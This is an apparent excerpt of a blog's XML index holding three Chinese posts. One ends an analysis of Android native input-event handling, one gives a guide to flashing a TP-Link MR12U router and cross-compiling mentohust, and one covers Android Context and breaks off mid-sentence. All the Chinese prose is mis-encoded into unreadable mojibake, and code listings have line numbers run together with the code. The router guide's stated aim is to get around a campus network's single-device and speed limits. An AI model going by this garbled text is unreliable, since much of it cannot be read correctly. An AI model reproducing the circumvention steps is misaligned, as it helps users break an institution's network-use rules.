èŽ·å–äº†appè¿›ç¨‹çš„æ¶ˆæ¯é˜Ÿåˆ—ï¼Œå¹¶è°ƒç”¨nativeæ–¹æ³•å¯¹mReceiverPtrè¿›è¡Œåˆå§‹åŒ–ï¼š 12345678910111213141516static jlong nativeInit(JNIEnv* env, jclass clazz, jobject receiverWeak, jobject inputChannelObj, jobject messageQueueObj) &#123; ... sp&lt;InputChannel&gt; inputChannel = android_view_InputChannel_getInputChannel(env, inputChannelObj); sp&lt;MessageQueue&gt; messageQueue = android_os_MessageQueue_getMessageQueue(env, messageQueueObj); ... sp&lt;NativeInputEventReceiver&gt; receiver = new NativeInputEventReceiver(env, receiverWeak, inputChannel, messageQueue); status_t status = receiver-&gt;initialize(); ... receiver-&gt;incStrong(gInputEventReceiverClassInfo.clazz); // retain a reference for the object return reinterpret_cast&lt;jlong&gt;(receiver.get());&#125; åˆ›å»ºäº†NativeInputEventReceiverå¯¹è±¡ï¼Œå¹¶è°ƒç”¨initialize()æ–¹æ³•è¿›è¡Œåˆå§‹åŒ–ï¼š 1234status_t NativeInputEventReceiver::initialize() &#123; setFdEvents(ALOOPER_EVENT_INPUT); return OK;&#125; 1234567891011void NativeInputEventReceiver::setFdEvents(int events) &#123; if (mFdEvents != events) &#123; mFdEvents = events; int fd = mInputConsumer.getChannel()-&gt;getFd(); if (events) &#123; mMessageQueue-&gt;getLooper()-&gt;addFd(fd, 0, events, this, NULL); &#125; else &#123; mMessageQueue-&gt;getLooper()-&gt;removeFd(fd); &#125; &#125;&#125; è¿™é‡Œå°†å®¢æˆ·ç«¯çš„InputChannelä¿å­˜çš„FdåŠ å…¥åˆ°äº†Native Looperä¸­è¿›è¡Œç›‘å¬ï¼Œå¯¹è¿”å›žçš„æ¶ˆæ¯è¿›è¡Œå¤„ç†ï¼š 12345678910111213141516171819202122232425262728293031323334353637int Looper::addFd(int fd, int ident, int events, const sp&lt;LooperCallback&gt;&amp; callback, void* data) &#123; &#123; // acquire lock AutoMutex _l(mLock); Request request; request.fd = fd; request.ident = ident; request.events = events; request.seq = mNextRequestSeq++; request.callback = callback; request.data = data; if (mNextRequestSeq == -1) mNextRequestSeq = 0; // reserve sequence number -1 struct epoll_event eventItem; request.initEventItem(&amp;eventItem); ssize_t requestIndex = mRequests.indexOfKey(fd); if (requestIndex &lt; 0) &#123; int epollResult = epoll_ctl(mEpollFd, EPOLL_CTL_ADD, fd, &amp; eventItem); if (epollResult &lt; 0) &#123; ALOGE("Error adding epoll events for fd %d: %s", fd, strerror(errno)); return -1; &#125; mRequests.add(fd, request); &#125; else &#123; int epollResult = epoll_ctl(mEpollFd, EPOLL_CTL_MOD, fd, &amp; eventItem); if (epollResult &lt; 0) &#123; if (errno == ENOENT) &#123; epollResult = epoll_ctl(mEpollFd, EPOLL_CTL_ADD, fd, &amp; eventItem); ... ... &#125; ... &#125; &#125;&#125; è¿™é‡Œå°†NativeInputEventReceiverä¼ å…¥çš„thisä½œä¸ºcallbackå­˜å…¥åˆ°requestä¸­ï¼Œ å†ä»¥fdä¸ºç´¢å¼•å‘mRequestsæ˜ å°„è¡¨ä¸­åŠ å…¥requestï¼Œç„¶åŽä»¥fdä½œä¸ºä¿¡å·è°ƒç”¨epoll_ctlç³»ç»Ÿè°ƒç”¨ï¼Œåˆ©ç”¨å®ƒå¯¹é€šä¿¡è¿‡ç¨‹è¿›è¡Œç›‘å¬ï¼Œåœ¨æ”¶åˆ°æ¶ˆæ¯ä¹‹åŽæœ€ç»ˆä¼šæ ¹æ®fdæ‰¾åˆ°mRequestsä¸­çš„requestä¿å­˜çš„callbackï¼Œå³NativeInputEventReceiverå¯¹è±¡ã€‚ å…³äºŽaddFdæ–¹æ³•çš„è¯¦ç»†åˆ†æžï¼Œå¯ä»¥æŸ¥çœ‹Nativeæ¶ˆæ¯æœºåˆ¶çš„åšæ–‡ å°ç»“çŽ°åœ¨æˆ‘ä»¬äº†è§£äº†ä»Žå†…æ ¸åˆ°åº”ç”¨æ•´ä¸ªè§¦æ‘¸äº‹ä»¶çš„ä¼ è¾“è¿‡ç¨‹ï¼Œå¹¶ä¸”çŸ¥é“äº†InputChannelåœ¨ä¸¤ç«¯çš„ç›‘å¬å»ºç«‹ä¸Žè§¦å‘çš„å‡½æ•°ï¼Œè‡³æ­¤ï¼Œè§¦æ‘¸äº‹ä»¶å·²ç»ä»Žç³»ç»Ÿåº•å±‚æ¥åˆ°äº†æˆ‘ä»¬çš„åº”ç”¨è¿›ç¨‹ï¼Œä¸‹ä¸€ç¯‡åšå®¢å°†ä»Žè§¦å‘å‡½æ•°å¼€å§‹è®²è§£äº‹ä»¶ä»Žnativeå±‚çœŸæ­£ä¼ å…¥javaå±‚çš„è¿‡ç¨‹ã€‚]]></content>
      <categories>
        <category>Android</category>
        <category>View</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>View</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[TP-Link mr12u-v1åˆ·openwrt+mentohustäº¤å‰ç¼–è¯‘ï¼ˆé™„æ–‡ä»¶ä¸‹è½½ï¼‰]]></title>
    <url>%2F2017%2F09%2F05%2Fmr12u_openwrt_mentohust%2F</url>
    <content type="text"><![CDATA[å†™åœ¨å‰é¢å¼€å­¦å­¦æ ¡å¯ç”¨äº†æœ‰çº¿ç½‘ï¼Œç”±äºŽæ ¡å›­ç½‘å­˜åœ¨åªèƒ½å•ä¸€è®¾å¤‡ç™»é™†çš„é™åˆ¶ä¸Žæ— çº¿ç™»é™†é™é€Ÿï¼Œæ‰€ä»¥æƒ³é€šè¿‡è·¯ç”±å™¨åˆ·openwrtå†ä½¿ç”¨mentohustè¿›è¡Œæ ¡å›­ç½‘çš„é”æ·è®¤è¯æ¥å®žçŽ°å¤šè®¾å¤‡ä¸Žä¸é™é€Ÿä½¿ç”¨ã€‚ åœ¨é€‰æ‹©è·¯ç”±å™¨æ—¶è€ƒè™‘äº†å¦‚ä¸‹å› ç´ ï¼š å¯åˆ·openwrtï¼šåªæœ‰ç‰¹å®šçš„å¤„ç†å™¨æ”¯æŒopenwrtï¼Œæ”¯æŒçš„è·¯ç”±å™¨åž‹å·åœ¨å®˜ç½‘æœ‰ä¸€ä¸ªåˆ—è¡¨ï¼Œç›´æŽ¥å‚ç…§è¿™ä¸ªåˆ—è¡¨é€‰å°±å¯ä»¥äº†ã€‚ æœ‰ç”µæº/usbä¾›ç”µï¼šåœ¨å¯å®¤ä½¿ç”¨çš„è¯å› ä¸ºæœ‰æ®µæ—¶é—´æ–­ç”µä½†ä¸æ–­ç½‘ï¼Œæ‰€ä»¥éœ€è¦è‡ªå¸¦ç”µæºæˆ–å¯ç”¨ç§»åŠ¨ç”µæºusbä¾›ç”µã€‚ æ€§ä»·æ¯”é«˜ï¼šå› ä¸ºåªç”¨äºŽè½¬å‘æ ¡å›­ç½‘ï¼Œæ‰€ä»¥å¯ä»¥ä¹°ä¾¿å®œä¸€äº›çš„ã€‚ æœ€ç»ˆé€‰æ‹©äº†TP-Link mr12uè¿™æ¬¾è·¯ç”±å™¨ï¼Œåœ¨é—²é±¼ä¸Šæ‰¾äº†ä¸€å®¶åŒåŸŽäºŒæ‰‹çš„ï¼Œ45å…ƒäººæ°‘å¸æ‹¿ä¸‹ã€‚ æ³¨æ„ä¸‹é¢éœ€è¦åœ¨linuxç»ˆç«¯çŽ¯å¢ƒä¸‹æ“ä½œ åˆ·ä¸æ­»Bootç”±äºŽè·¯ç”±å™¨å›ºä»¶çš„ç‰¹æ®Šæ€§ï¼Œä¸€æ—¦åˆ·å´©äº†æˆ–è€…è®¾ç½®é”™è¯¯å¯¼è‡´æ— æ³•æ­£å¸¸ç™»é™†è·¯ç”±å™¨ï¼Œé‚£ä¹ˆå°±æ— æ³•å¯¹è·¯ç”±å™¨è¿›è¡Œç®¡ç†ï¼Œä¹Ÿå°±æ˜¯æ‰€è°“çš„å˜ç –ã€‚ ä¸æ­»bootçš„ä½œç”¨å°±æ˜¯åœ¨è¿™ç§æƒ…å†µä¸‹æä¾›è¿›è·¯ç”±è®¾ç½®é‡æ–°åˆ·å›ºä»¶çš„æœºä¼šã€‚ åˆ·è§£é”å›ºä»¶ç”±äºŽU-Bootåˆ†åŒºé»˜è®¤æ˜¯é”å®šçš„ï¼Œæ‰€ä»¥æ— æ³•åˆ·å…¥æ–°çš„bootã€‚å› æ­¤æˆ‘ä»¬è¦å…ˆåˆ·å…¥ä¸€ä¸ªä¿®æ”¹è¿‡çš„è§£é”U-Bootåˆ†åŒºçš„å›ºä»¶ï¼Œè¿™ä¸ªä¿®æ”¹è¿‡çš„å›ºä»¶å¯ä»¥åœ¨ç™¾åº¦ç½‘ç›˜ä¸‹è½½ï¼Œå¦å¤–ç”±äºŽæˆ‘æ‰‹ä¸Šçš„è¿™ä¸ªæ˜¯v1ç‰ˆæœ¬çš„ï¼Œä¸Žv2ç‰ˆæœ¬çš„ç¡¬ä»¶ä¸åŒï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨çš„æ˜¯mr11u-v2çš„è§£é”å›ºä»¶ï¼ˆå³openwr-ar71xx-generic-tl-mr11u-v2-squashfs-factory.binï¼‰ã€‚ä¸‹è½½å®Œä»¥åŽå…ˆé•¿æŒ‰å¤ä½é”®å¤ä½è·¯ç”±å™¨ï¼Œè¿žæŽ¥ä¸Šä»¥åŽç›´æŽ¥è¿›å…¥192.168.1.1 TP-Linké»˜è®¤çš„ç®¡ç†ç•Œé¢ï¼Œåœ¨ä¸‹å›¾è¿™é‡Œé€‰æ‹©åˆšä¸‹å¥½çš„å›ºä»¶åˆ·å…¥å³å¯ï¼š ï¼ˆå›¾æºç½‘ç»œï¼‰ åˆ·ä¸æ­»bootå…ˆä¸‹è½½ä¸æ­»bootï¼š http://viseator.com/file/breed-ar9331-mr12u.bin è·¯ç”±å™¨è‡ªåŠ¨é‡å¯ä»¥åŽä½¿ç”¨ç½‘çº¿è¿žæŽ¥ç”µè„‘ä¸Žè·¯ç”±å™¨ï¼Œå…ˆç”¨æµè§ˆå™¨ç™»é™†192.168.1.1ï¼Œç”¨æˆ·åä¸ºrootå¯†ç ä¸ºç©ºï¼Œç„¶åŽè®¾ç½®sshå¯†ç å¹¶ä¿å­˜ã€‚ çŽ°åœ¨å°±å¯ä»¥ä½¿ç”¨sshç”¨rootä¸Žåˆšåˆšè®¾ç½®çš„å¯†ç ç™»é™†è·¯ç”±å™¨äº†ï¼š 1ssh root@192.168.1.1 ç™»é™†ä»¥åŽå…ˆæŸ¥çœ‹å¹¶è®°ä¸‹macåœ°å€ï¼Œä¹‹åŽè¦ç”¨åˆ°ï¼š 1ifconfig eth0 å›¾ç‰‡æ¥æº ç„¶åŽexité€€å‡ºsshï¼Œä½¿ç”¨scpå‘½ä»¤ä¼ é€ä¸‹è½½å¥½çš„bootåŒ…ï¼š 1scp breed-ar9331-mr12u.bin root@192.168.1.1:/tmp/ å†æ¬¡ç™»é™†è·¯ç”±å™¨ï¼Œåˆ·å…¥U-Bootï¼š 123ssh root@192.168.1.1cd /tmpmtd write breed-ar9331-mr12u.bin u-boot ç­‰å¾…å‘½ä»¤è¿”å›žåŽç›´æŽ¥å°†è·¯ç”±å™¨å…³æœºã€‚ æƒ³è¦è¿›å…¥ä¸æ­»bootï¼Œåªéœ€æŒ‰ä½resetå¤ä½é”®ä¸æ”¾ï¼Œå†å¼€æœºï¼Œç­‰å¾…ä¸ªåå‡ ç§’åŽæ¾å¼€ï¼Œå†æœ‰çº¿è¿žæŽ¥ç”µè„‘ä¸Žè·¯ç”±å™¨ï¼Œæµè§ˆå™¨è¾“å…¥192.168.1.1å°±å¯ä»¥è¿›å…¥ç®¡ç†ç•Œé¢äº†ï¼Œä»¥åŽå˜ç –äº†åªè¦è¿™æ ·éƒ½å¯ä»¥é‡æ–°åˆ·å›ºä»¶ï¼Œæ‰€ä»¥ç§°ä¸æ­»ã€‚ è¿›å…¥ä¸æ­»bootä»¥åŽï¼Œå…ˆè¿›å…¥ä¸‹å›¾ç•Œé¢è®¾ç½®ä¹‹å‰è®°å½•çš„macåœ°å€ï¼š å›¾ç‰‡æ¥æº åˆ·å…¥æœ€æ–°å›ºä»¶ï¼ˆå¯é€‰ï¼‰ä¸‹é¢å°±å¯ä»¥ç›´æŽ¥åœ¨ä¸æ­»booté‡Œé¢é€‰æ‹©å›ºä»¶æ›´æ–°åˆ·å…¥æœ€æ–°çš„å›ºä»¶äº†ï¼Œæœ€æ–°å›ºä»¶çš„ä¸‹è½½å¯ä»¥åˆ°è¿™é‡Œæ‰¾åˆ°ã€‚ ä½†æ˜¯mr12uçš„é—ªå­˜åªæœ‰å¯æ€œçš„4mï¼Œå¦‚æžœå®‰è£…æœ€æ–°çš„openwrtå°±æ²¡æœ‰ç©ºé—´æ”¾ä¸‹mentohustäº†ï¼Œæ‰€ä»¥è¿˜ä¸å¦‚å°±ç›´æŽ¥ç”¨è¿™ä¸ªè§£é”ç”¨çš„å›ºä»¶ã€‚ äº¤å‰ç¼–è¯‘mentohuståœ¨ç½‘ä¸Šæ‰¾äº†ä¸€åœˆæ„£æ˜¯æ²¡æ‰¾åˆ°ar71xxå¤„ç†å™¨å·²ç»ç¼–è¯‘å¥½çš„mentohustï¼Œåªèƒ½é€‰æ‹©è‡ªå·±äº¤å‰ç¼–è¯‘äº†ã€‚æ²¡æœ‰æ¡ä»¶è‡ªå·±ç¼–è¯‘çš„å¯ä»¥ä½¿ç”¨æˆ‘ç¼–è¯‘å¥½çš„åªé€‚ç”¨äºŽar71xxå¤„ç†å™¨çš„mentohust: http://www.viseator.com/file/mentohust ã€‚ ä¾èµ–åŒ…çš„å®‰è£…å¯ä»¥åˆ°https://wiki.openwrt.org/zh-cn/doc/howto/buildroot.exigence æ ¹æ®è‡ªå·±çš„å‘è¡Œç‰ˆå®‰è£…å¿…è¦çš„è½¯ä»¶åŒ…ã€‚ ä¸‹è½½ç¼–è¯‘å·¥å…·é“¾é¦–å…ˆåˆ°https://downloads.openwrt.org/snapshots/trunk/ar71xx/generic/ é¡µé¢ä¸‹è½½ OpenWrt-SDK-ar71xx-generic_gcc-5.3.0_musl-1.1.16.Linux-x86_64.tar.bz2 å¤„ç†å™¨SDKï¼Œè§£åŽ‹åŽè¿›å…¥ç›®å½•ä¸‹çš„./staging_dir/toolchain-mips_34kc_gcc-5.3.0_musl-1.1.16/binã€‚ é…ç½®çŽ¯å¢ƒå˜é‡12345678export PATH=$PATH:åˆ°ä¸Šè¿°/staging_dir/toolchain-mips_34kc_gcc-5.3.0_musl-1.1.16/bin ç›®å½•çš„å®Œæ•´è·¯å¾„export CC=mipsel-openwrt-linux-gcc export CPP=mipsel-openwrt-linux-cpp export GCC=mipsel-openwrt-linux-gcc export CXX=mipsel-openwrt-linux-g++ export RANLIB=mipsel-openwrt-linux-uclibc-ranlibexport LDFLAGS="-static" export CFLAGS="-Os -s" ç¼–è¯‘libpcapåŠ¨æ€é“¾æŽ¥åº“åˆ° http://www.tcpdump.org/ ä¸‹è½½libpcap-1.8.1.tar.gzï¼Œè§£åŽ‹ä»¥åŽè¿›å…¥ç›®å½•ï¼Œæ‰§è¡Œï¼š 1./configure --host=mipsel-openwrt-linux --prefix=è‡ªå·²è®¾å®šè·¯å¾„/ --with-pcap=linux ç„¶åŽæ‰§è¡Œï¼š 1make ä¼šæŠ¥é”™è¯¯ï¼Œä½†æ˜¯ä¸å½±å“æˆ‘ä»¬éœ€è¦çš„libpcap.aæ–‡ä»¶ï¼Œåœ¨å½“å‰ç›®å½•ä¸‹æ‰¾åˆ°è¿™ä¸ªæ–‡ä»¶å¤åˆ¶å‡ºæ¥å¤‡ç”¨ã€‚ ç¼–è¯‘mentohustå…‹éš†mentohustæºç ï¼š 1git clone https://github.com/hyrathb/mentohust è¿›å…¥ç›®å½•ï¼Œé¦–å…ˆç”Ÿæˆconfigureï¼š 1sh autogen.sh ç„¶åŽé…ç½®ï¼š 1./configure --host=mipsel-openwrt-linux --disable-encodepass --disable-notify --prefix=è‡ªè®¾ç›®å½• --with-pcap=å‰é¢ä¿å­˜çš„libpcap.aæ–‡ä»¶è·¯å¾„ ç¼–è¯‘ï¼š 1make æˆåŠŸä»¥åŽå°±å¯ä»¥åœ¨srcç›®å½•ä¸‹æ‰¾åˆ°ç¼–è¯‘å¥½çš„mentohustæ–‡ä»¶äº†ã€‚ éƒ¨ç½²æˆ‘ä»¬æŠŠç¼–è¯‘å¥½çš„æ–‡ä»¶ä¼ é€åˆ°è·¯ç”±å™¨ä¸­ï¼š 1scp mentohust root@192.168.1.1:/root å®‰è£…libpcapè·¯ç”±å™¨ä¸­é»˜è®¤æ²¡æœ‰æˆ‘ä»¬ä¾èµ–çš„libpcapåº“ï¼Œæˆ‘ä»¬è¦æ‰‹åŠ¨å®‰è£…ï¼Œå…ˆä¸‹è½½ï¼š http://www.viseator.com/file/libpcap_1.0.0-2_ar71xx.ipk ç„¶åŽä¼ é€åˆ°è·¯ç”±å™¨ä¸­ï¼š 1scp libpcap_1.0.0-2_ar71xx.ipk root@192.168.1.1:/tmp ä¸‹é¢ç™»é™†è·¯ç”±å™¨ï¼Œè¿›å…¥/tmpç›®å½•ï¼Œæ‰§è¡Œï¼š 1opkg install libpcap_1.0.0-2_ar71xx.ipk æ–°å»ºwifiä¸Žæ¡¥æŽ¥é…ç½®æ–°åˆ·çš„è·¯ç”±å™¨åªæœ‰ä¸€ä¸ªé»˜è®¤æŽ¥å…¥ç‚¹ï¼Œæˆ‘ä»¬å…ˆåˆ°è·¯ç”±å™¨ç®¡ç†ç•Œé¢ä¿®æ”¹æŽ¥å…¥ç‚¹ã€‚å¢žåŠ è®¿é—®å¯†ç ç­‰ç­‰ã€‚è¿™ä¸€æ­¥çš„é…ç½®å°±ä¸å¤šè¯´äº†ç½‘ä¸Šéƒ½æœ‰ã€‚ ç”±äºŽè¿™ä¸ªè·¯ç”±å™¨åªæœ‰ä¸€ä¸ªæŽ¥å£ï¼Œæˆ‘ä»¬çŽ°åœ¨æ˜¯å°†å®ƒä½œä¸ºlanå£åœ¨ç”¨çš„ï¼Œä½†æ˜¯å®žé™…ä¸Šæˆ‘ä»¬éœ€è¦ä½¿ç”¨å®ƒä½œä¸ºwanå£æ¥è¿žæŽ¥æ ¡å›­ç½‘è®¤è¯ä¸Šç½‘ï¼Œå¹¶ä¸”è¦å°†lanå£ä¸Žwifiè¿›è¡Œæ¡¥æŽ¥ä½¿å¾—æˆ‘ä»¬ä¾æ—§å¯ä»¥é€šè¿‡192.168.1.1è¿™ä¸ªåœ°å€æ¥ç®¡ç†è·¯ç”±å™¨ã€‚ è¿™æ­¥æ“ä½œéœ€è¦ç›´æŽ¥ä¿®æ”¹/etc/config/networkæ–‡ä»¶ï¼Œå¦‚æžœä½¿ç”¨å›¾å½¢ç•Œé¢é…ç½®å¯èƒ½ä¼šå¯¼è‡´å˜ç –ã€‚ æˆ‘ä»¬ç™»é™†è·¯ç”±å™¨ä»¥åŽç›´æŽ¥ç”¨vimä¿®æ”¹ä¸Šè¿°æ–‡ä»¶ï¼š 1vim /etc/config/network ä¸‹é¢æä¾›æˆ‘æ‰¾åˆ°çš„ç¤ºä¾‹æ–‡ä»¶ä¾›å‚è€ƒï¼šå‡ºå¤„ 123456789101112131415161718config interface &apos;loopback&apos; option ifname &apos;lo&apos; option proto &apos;static&apos; option ipaddr &apos;127.0.0.1&apos; option netmask &apos;255.0.0.0&apos;config interface &apos;lan&apos; option type &apos;bridge&apos; option proto &apos;static&apos; option ipaddr &apos;192.168.1.1&apos; option netmask &apos;255.255.255.0&apos;config interface &apos;wan&apos; option ifname &apos;eth0&apos; option _orig_ifname &apos;eth0&apos; option _orig_bridge &apos;false&apos; option proto &apos;dhcp&apos; option macaddr &apos;xx:xx:xx:xx:xx:xx&apos;æ›¿æ¢ä¸ºè‡ªå·±çš„mac ä¿®æ”¹åŽä¿å­˜ï¼Œç„¶åŽrebooté‡å¯ã€‚ çŽ°åœ¨å°±ä¸èƒ½é€šè¿‡æœ‰çº¿æ¥ç®¡ç†è·¯ç”±å™¨äº†ï¼Œå› ä¸ºç®¡ç†åœ°å€å·²ç»æ¡¥æŽ¥åˆ°äº†æ— çº¿ä¸Šäº†ã€‚æ‰€ä»¥æˆ‘ä»¬è¦ä½¿ç”¨æ— çº¿è¿žæŽ¥ï¼Œæœ‰çº¿æŽ¥æ ¡å›­ç½‘ï¼Œç„¶åŽç™»é™†åˆ°è·¯ç”±å™¨ã€‚ æ‰¾åˆ°æˆ‘ä»¬å­˜æ”¾mentohustçš„/rootç›®å½•ï¼ˆé»˜è®¤å°±æ˜¯ï¼‰ï¼Œå¯åŠ¨mentohust: 1./mentohust -u username -p password -n eth0 å¦‚æžœè¦åŽå°è¿è¡ŒåŠ ä¸ª-b1å°±å¯ä»¥äº†ã€‚ å¦‚æžœä¸€åˆ‡æ­£å¸¸çš„è¯çŽ°åœ¨æ— çº¿å°±å¯ä»¥æ­£å¸¸ä¸Šç½‘äº†ã€‚]]></content>
      <categories>
        <category>openwrt</category>
      </categories>
      <tags>
        <tag>openwrt</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android Contextç†è§£ä¸Žé™·é˜±]]></title>
    <url>%2F2017%2F07%2F19%2Fandroid_context%2F</url>
    <content type="text"><![CDATA[Context?Contextåœ¨å®‰å“å¼€å‘æ—¶æ˜¯ä¸€ä¸ªéžå¸¸å¸¸è§çš„ç»„ä»¶ï¼Œæˆ‘ä»¬ä¼šåœ¨è®¸å¤šåœ°æ–¹ä½¿ç”¨å®ƒï¼Œä¸¾ä¸€äº›ä¾‹å­ï¼š å¯åŠ¨æ–°çš„Activity Service å‘é€å¹¿æ’­ï¼ŒæŽ¥æ”¶å¹¿æ’­ å¡«å……View èŽ·å–èµ„æº ç›¸ä¿¡æ¯ä¸€ä¸ªå¼€å‘è€…åœ¨çœ‹è§å®ƒæ—¶éƒ½æœ‰è¿‡è¿™æ ·ä¸€äº›ç–‘é—®ï¼š Contextæ˜¯ä»€ä¹ˆ Contextçš„ä½œç”¨ Contextä»Žå“ªé‡Œæ¥ åŒæ—¶ï¼Œæˆ‘ä»¬ä¹Ÿç»åŽ†è¿‡éœ€è¦ä¸€ä¸ªContextä½†ä¸çŸ¥é“å¦‚ä½•åŽ»æ­£ç¡®èŽ·å–/ä¼ é€’çš„æƒ…å†µï¼Œäº‹å®žä¸Šä¸æ­£ç¡®åœ°ä¿å­˜ä¸€ä¸ªContextçš„å¼•ç”¨å¯èƒ½ä¼šå¯¼è‡´éƒ¨åˆ†å†…å­˜ä¸èƒ½è¢«æ­£ç¡®GCä»Žè€Œé€ æˆäº‹å®žä¸Šçš„å†…å­˜æ³„æ¼ã€‚ æœ¬æ–‡å°†ç€é‡å¯¹ä¸Šé¢è¿™äº›å†…å®¹è¿›è¡Œè®²è§£ã€‚ Contextçš„å®šä¹‰å­—é¢ä¸Šè§£é‡Šï¼ŒContextæ„ä¸ºâ€œçŽ¯å¢ƒâ€ï¼Œè¿™ä¸ªè§£é‡Šæ¯”è¾ƒç¬¦åˆå®ƒçš„ä½œç”¨ã€‚ å®˜æ–¹æ–‡æ¡£ä¸­å¯¹Contextçš„è§£é‡Šæ˜¯ï¼š Interface to global information about an application environment. This is an abstract class whose implementation is provided by the Android system. It allows access to application-specific resources and classes, as well as up-calls for application-level operations such as launching activities, broadcasting and receiving intents, etc. å…³äºŽåº”ç”¨çŽ¯å¢ƒçš„å…¨å±€ä¿¡æ¯çš„æŽ¥å£ã€‚å®ƒæ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œå…·ä½“ç”±å®‰å“ç³»ç»Ÿæ¥å®žçŽ°ã€‚å®ƒå…è®¸æˆ‘ä»¬åŽ»è®¿é—®ç‰¹å®šçš„åº”ç”¨çš„èµ„æºå’Œç±»ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥ç»ç”±å®ƒåŽ»å‘ä¸Šè¯·æ±‚åº”ç”¨çº§åˆ«çš„æ“ä½œä¾‹å¦‚å¯åŠ¨Activityã€å‘é€å¹¿æ’­ã€æŽ¥æ”¶intentsç­‰ç­‰ã€‚ æˆ‘ä»¬å¯ä»¥æŠŠå®ƒçœ‹ä½œæ˜¯ä¸€ä¸ªè¿žæŽ¥æˆ‘ä»¬ä»£ç ä¸Žå®‰å“ç³»ç»Ÿçš„â€œæ¡¥æ¢â€ï¼Œæˆ‘ä»¬å¼€å‘çš„åº”ç”¨æ˜¯ä¸Žè¿è¡Œåœ¨è®¾å¤‡ä¸Šçš„æ“ä½œç³»ç»Ÿç´§å¯†ç›¸å…³çš„ï¼Œåªèƒ½é€šè¿‡æ“ä½œç³»ç»Ÿï¼Œæˆ‘ä»¬æ‰èƒ½åŽ»å¯åŠ¨ä¸€ä¸ªæ–°çš„Activityï¼Œå‘å…¶ä»–åº”ç”¨å‘é€å¹¿æ’­ï¼Œå¯åŠ¨ä¸€ä¸ªæ–°çš„Serviceæˆ–æ˜¯è®¿é—®æˆ‘ä»¬å­˜æ”¾åœ¨apkä¸­çš„èµ„æºæ–‡ä»¶ã€‚ Contextå°±æ˜¯ç³»ç»Ÿä¸ºæˆ‘ä»¬æä¾›ä¸Šè¿°åŠŸèƒ½çš„ä¸€ä¸ªæŽ¥å£ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨å®ƒåŽ»å®Œæˆä¸Žç³»ç»Ÿçš„ä¿¡æ¯äº¤æ¢ã€‚ Contextä»Žå“ªé‡Œæ¥Contextä½œä¸ºä¸€ä¸ªä¾èµ–äºŽç³»ç»Ÿçš„ç±»ï¼ŒSDKä¸­åªç»™äº†æˆ‘ä»¬ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œå…·ä½“çš„å®žçŽ°ç”±ç³»ç»Ÿå®Œæˆï¼Œä¸‹æ–‡ä¸¾ä¾‹ä½¿ç”¨çš„ContextImplå°±æ˜¯AOSPä¸­å®‰å“æºç å¯¹äºŽContextçš„ä¸€ä¸ªå®žçŽ°ã€‚ Contextçš„ä½œç”¨Contextä¸­å°è£…çš„ä¿¡æ¯æˆ‘ä»¬å¯ä»¥çœ‹çœ‹Contexté‡Œé¢åŒ…å«äº†å“ªäº›ä¸œè¥¿ï¼ˆéƒ¨åˆ†ï¼‰ã€‚ 12345678910111213141516171819private final String mBasePackageName; private final String mOpPackageName; //è½¯ä»¶åŒ…åprivate final Resources mResources;private final ResourcesManager mResourcesManager; //ç”¨äºŽç®¡ç†èµ„æºæ–‡ä»¶private final Display mDisplay; //ä¸ºViewå¡«å……ç­‰æä¾›å±å¹•å°ºå¯¸ã€åƒç´ å¯†åº¦ç­‰ä¿¡æ¯private final DisplayAdjustments mDisplayAdjustments = new DisplayAdjustments();private Resources.Theme mTheme = null; //ä¸»é¢˜ä¿¡æ¯private File mCacheDir;@GuardedBy("mSync")private File mCodeCacheDir;...@GuardedBy("mSync")private File[] mExternalObbDirs;@GuardedBy("mSync")private File[] mExternalFilesDirs;@GuardedBy("mSync")private File[] mExternalCacheDirs;@GuardedBy("mSync")private File[] mExternalMediaDirs; //å„ç§æ–‡ä»¶è·¯å¾„ è¿™äº›åŸŸçš„å­˜åœ¨ä¸ºåŠŸèƒ½æä¾›äº†å¿…è¦çš„ä¿¡æ¯ï¼Œä¾‹å¦‚åœ¨LayoutInflaterå¡«å……Viewæ—¶éœ€è¦ä¸€ä¸ªcontextä½œä¸ºå‚æ•°ï¼Œæˆ‘ä»¬æŸ¥çœ‹è¿™ä¸ªcontextå¦‚ä½•è¢«ä½¿ç”¨ï¼š 1final XmlResourceParser childParser = context.getResources().getLayout(layout); æˆ‘ä»¬ä¼ å…¥çš„ResourceIdæœ€ç»ˆä¼šè¢«é€šè¿‡contextçš„getResource()æ–¹æ³•èŽ·å–çš„Resourceå¯¹è±¡çš„getLayout()æ–¹æ³•å®šä½åˆ°å¯¹åº”çš„xmlæ–‡ä»¶æä¾›ç»™Inflaterè¿›è¡Œè§£æžã€‚ 123456789// Apply a theme wrapper, if allowed and one is specified.if (!ignoreThemeAttr) &#123; final TypedArray ta = context.obtainStyledAttributes(attrs, ATTRS_THEME); final int themeResId = ta.getResourceId(0, 0); if (themeResId != 0) &#123; context = new ContextThemeWrapper(context, themeResId); &#125; ta.recycle();&#125; åœ¨è¿™é‡Œè°ƒç”¨äº†contextçš„obtainStyledAttributes()æ–¹æ³•ï¼š 1234public final TypedArray obtainStyledAttributes( AttributeSet set, @StyleableRes int[] attrs) &#123; return getTheme().obtainStyledAttributes(set, attrs, 0, 0);&#125; æœ€ç»ˆä½¿ç”¨äº†contextä¸­å­˜æ”¾çš„ä¸»é¢˜ä¿¡æ¯ä¸ºå¡«å……çš„viewè®¾ç½®å±žæ€§ã€‚ çŽ°åœ¨æˆ‘ä»¬çŸ¥é“ï¼Œæˆ‘ä»¬å­˜æ”¾åœ¨resæ–‡ä»¶å¤¹ä¸‹çš„å†…å®¹ï¼ˆå¸ƒå±€æ–‡ä»¶ã€å­—ç¬¦ä¸²æ–‡ä»¶ã€å›¾ç‰‡ã€ä¸»é¢˜â€¦â€¦ï¼‰éƒ½éœ€è¦é€šè¿‡ä¸€ä¸ªcontextåŽ»å‘ç³»ç»ŸèŽ·å–ã€‚ é‚£ä¹ˆä¸ºä»€ä¹ˆåœ¨å¯åŠ¨activityã€å¯åŠ¨serviceã€å‘é€å¹¿æ’­æ—¶éƒ½éœ€è¦ä½¿ç”¨contextå‘¢ï¼Ÿå› 